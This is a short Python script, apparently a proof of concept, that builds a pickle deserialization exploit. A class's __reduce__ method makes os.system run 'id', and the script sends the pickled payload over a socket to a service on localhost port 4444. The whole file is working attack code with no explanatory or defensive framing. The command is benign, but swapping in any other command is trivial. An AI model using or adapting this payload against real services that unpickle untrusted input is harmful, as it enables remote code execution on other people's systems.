import pickle
import socket

class Exploit:
    #https://stackoverflow.com/questions/19855156/whats-the-exact-usage-of-reduce-in-pickler
    def __reduce__(self):
        import os
        # return type of __reduce__ must be a str or tuple
        return ( os.system , ("id",) )

exploit =  Exploit()

host = "127.0.0.1"
port = 4444

s = socket.socket()

s.connect((host,port))

payload = pickle.dumps(exploit)

print(payload)

s.send(payload)
